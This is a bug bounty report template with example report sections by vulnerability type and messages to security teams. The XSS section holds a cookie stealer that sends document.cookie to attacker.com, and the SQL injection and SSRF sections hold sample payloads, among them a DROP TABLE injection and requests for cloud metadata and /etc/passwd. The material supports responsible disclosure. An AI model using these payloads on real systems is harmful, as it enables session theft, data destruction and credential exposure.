# 🐛 Bug Bounty Report Template

> **Review status:** Source verification pending. Confirm version-sensitive commands against the official documentation before use.

```
██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗
██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝
██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝ 
██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝  
██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║   
╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝   
██████╗ ███████╗██████╗  ██████╗ ██████╗ ████████╗
██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝
██████╔╝█████╗  ██████╔╝██║   ██║██████╔╝   ██║   
██╔══██╗██╔══╝  ██╔═══╝ ██║   ██║██╔══██╗   ██║   
██║  ██║███████╗██║     ╚██████╔╝██║  ██║   ██║   
╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
```

---

## 🎯 Quick Template

````markdown
## Summary
[One-line description of the vulnerability]

## Severity
[Critical/High/Medium/Low] - CVSS: X.X

## Vulnerability Type
[XSS/SQLi/IDOR/SSRF/etc.]

## URL/Endpoint
`https://example.com/vulnerable-endpoint`

## Steps to Reproduce
1. Step 1
2. Step 2
3. Step 3

## Impact
[What an attacker can achieve]

## Proof of Concept
[Code/Screenshots/Video]

## Remediation
[How to fix it]
````

---

## 📝 Full Report Template

### Title Format
```
[Severity] [Vulnerability Type] in [Feature/Endpoint] allows [Impact]

Examples:
- [Critical] SQL Injection in Login Form allows Database Extraction
- [High] Stored XSS in Comments allows Account Takeover
- [Medium] IDOR in /api/users/{id} exposes PII of other users
```

---

## 📋 Detailed Report Structure

````markdown
# [Vulnerability Type] in [Feature/Endpoint]

## Summary
A [vulnerability type] vulnerability was discovered in [feature/endpoint] that 
allows an attacker to [impact]. This vulnerability affects [scope/users].

## Severity Assessment

| Metric | Value |
|--------|-------|
| **Severity** | Critical / High / Medium / Low |
| **CVSS Version / Score** | CVSS 4.0 / X.X (if the program uses CVSS) |
| **CVSS Vector** | `CVSS:4.0/...` |
| **CWE** | CWE-XXX: [CWE Name] |
| **Tested Role** | Unauthenticated / User / Admin |
| **Confidence** | Confirmed / High / Moderate |

## Vulnerability Details

### Affected Asset
- **URL:** `https://example.com/path/to/endpoint`
- **Parameter:** `parameter_name`
- **Method:** GET/POST
- **Authentication:** Required/Not Required

### Vulnerable Code/Configuration
[If visible/applicable]

## Steps to Reproduce

### Prerequisites
- Account required: Yes/No
- Special access needed: [describe]
- Browser/Tool: [specify]

### Reproduction Steps

1. **Navigate to the vulnerable endpoint**
   ```
   https://example.com/vulnerable-page
   ```

2. **Inject the payload**
   ```
   [Payload here]
   ```

3. **Observe the result**
   - [What happens]

### HTTP Request
```http
POST /api/endpoint HTTP/1.1
Host: example.com
Content-Type: application/json
Cookie: session=abc123

{
  "parameter": "malicious_payload_here"
}
```

### HTTP Response
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "result": "vulnerable_response"
}
```

## Proof of Concept

### Payload Used
````
[Your payload here]
```

### Screenshot Evidence
![Description](attachment_url)

### Video PoC
[Link to video demonstration]

### Automated PoC Script (Optional)
```python
import requests

url = "https://example.com/vulnerable"
payload = {"param": "malicious_input"}
response = requests.post(url, json=payload)
print(response.text)
```

## Impact Assessment

### Technical Impact
- **Confidentiality:** [Data that can be accessed]
- **Integrity:** [Data that can be modified]
- **Availability:** [Service disruption possible]

### Business Impact
- [Financial impact]
- [Reputational damage]
- [Regulatory/Compliance violations]
- [Number of affected users]

### Attack Scenario
An attacker could exploit this vulnerability to:
1. [Specific action 1]
2. [Specific action 2]
3. [Specific action 3]

## Remediation Recommendations

### Immediate Fix
[Quick fix to mitigate]

### Long-term Solution
[Proper remediation]

### Code Fix Example
```python
# Before (Vulnerable)
query = f"SELECT * FROM users WHERE id = {user_input}"

# After (Fixed)
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_input,))
```

## References
- [OWASP Link]
- [CWE Link]
- [Related CVEs]
- [Blog posts/Research]

## Timeline
| Date | Action |
|------|--------|
| YYYY-MM-DD | Vulnerability discovered |
| YYYY-MM-DD | Report submitted |
| YYYY-MM-DD | Acknowledged by vendor |
| YYYY-MM-DD | Fix deployed |
| YYYY-MM-DD | Bounty awarded |
```

---

## 🔥 Templates by Vulnerability Type

### XSS (Cross-Site Scripting)

````markdown
## Summary
A reflected/stored XSS vulnerability in [endpoint] allows attackers to execute 
arbitrary JavaScript in victims' browsers.

## Payload
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
```

## Impact
- Session hijacking via cookie theft
- Account takeover
- Keylogging
- Phishing attacks
- Malware distribution

## PoC
```javascript
// Cookie stealer
<script>
fetch('https://attacker.com/steal?c='+document.cookie)
</script>
```
````

### SQL Injection

````markdown
## Summary
SQL Injection in [parameter] at [endpoint] allows extraction of database contents.

## Payload
```sql
' OR '1'='1'--
' UNION SELECT username,password FROM users--
1; DROP TABLE users--
```

## Evidence
- Database: MySQL 8.0
- Tables extracted: users, orders, payments
- Records accessible: 10,000+

## SQLMap Command
```bash
sqlmap -u "https://example.com/page?id=1" --dbs --batch
```
````

### IDOR (Insecure Direct Object Reference)

````markdown
## Summary
IDOR vulnerability in [endpoint] allows accessing other users' [resource].

## Reproduction
1. Login as User A (ID: 100)
2. Access: `GET /api/users/100/profile`
3. Change ID to 101: `GET /api/users/101/profile`
4. Observe: User B's data returned

## Impact
- PII exposure (name, email, address)
- [X] users' data accessible
- GDPR/Privacy violation

## Evidence
| Request | Response |
|---------|----------|
| `/api/users/100` | User A's data ✓ |
| `/api/users/101` | User B's data ✗ |
| `/api/users/102` | User C's data ✗ |
````

### SSRF (Server-Side Request Forgery)

````markdown
## Summary
SSRF in [feature] allows making requests to internal services.

## Payload
````
https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
https://example.com/fetch?url=http://localhost:6379/
https://example.com/fetch?url=file:///etc/passwd
```

## Accessed Internal Resources
- AWS metadata endpoint
- Internal Redis server
- Local filesystem

## Evidence
```
HTTP/1.1 200 OK

ami-id: ami-12345678
instance-id: i-1234567890abcdef0
```
```

### Authentication Bypass

````markdown
## Summary
Authentication bypass in [feature] allows unauthorized access to [resource].

## Bypass Method
[Describe the bypass technique]

## Reproduction
1. Access protected endpoint without auth
2. [Specific technique]
3. Access granted

## Impact
- Admin panel access
- User impersonation
- Data manipulation
````

---

## 📊 Severity Guidelines

### Critical (P1)
```
- RCE (Remote Code Execution)
- SQL Injection with data extraction
- Authentication bypass to admin
- Full account takeover
- Payment/financial manipulation
- PII of all users exposed
```

### High (P2)
```
- Stored XSS with significant impact
- IDOR accessing sensitive data
- SSRF to internal services
- Privilege escalation
- Sensitive data exposure
```

### Medium (P3)
```
- Reflected XSS
- CSRF on sensitive actions
- Information disclosure
- Rate limiting bypass
- Session fixation
```

### Low (P4)
```
- Self-XSS
- Non-sensitive IDOR
- Missing security headers
- Verbose error messages
- Username enumeration
```

---

## ✅ Submission Checklist

````markdown
## Before Submitting

□ Clear, descriptive title
□ Accurate severity assessment
□ Step-by-step reproduction
□ Working proof of concept
□ Impact clearly explained
□ Screenshots/video attached
□ Remediation suggested
□ In-scope asset confirmed
□ Not a duplicate (searched)
□ Grammar/spelling checked
□ Sensitive data redacted
□ Contact info included
````

---

## 💡 Pro Tips

### Do's ✅
```
✓ Be clear and concise
✓ Include all necessary details
✓ Provide working PoC
✓ Explain the impact
✓ Suggest remediation
✓ Be professional and respectful
✓ Follow responsible disclosure
✓ Respond to questions promptly
```

### Don'ts ❌
```
✗ Don't access real user data
✗ Don't test on production
✗ Don't exceed scope
✗ Don't use automated scanners without permission
✗ Don't disclose before fix
✗ Don't be aggressive about bounty
✗ Don't submit duplicates
✗ Don't submit theoretical issues
```

---

## 📧 Communication Templates

### Initial Report
```
Hi [Security Team],

I've discovered a [severity] [vulnerability type] vulnerability in 
[product/feature]. Please find the full details in my report.

Summary: [One line]
Impact: [Brief impact]
PoC: [Attached/Included]

Please let me know if you need any additional information.

Best regards,
[Your name]
[HackerOne/Bugcrowd profile]
```

### Follow-up
```
Hi,

I'm following up on report #[ID] submitted on [date]. 
Could you provide an update on the status?

Thank you.
```

### Bounty Discussion
```
Thank you for triaging my report. I believe the severity should be 
[higher/different] because:

1. [Reason 1]
2. [Reason 2]

Would you consider re-evaluating the bounty amount?
```

---

**Back to Reporting:** [📝 Reporting Templates](./README.md)
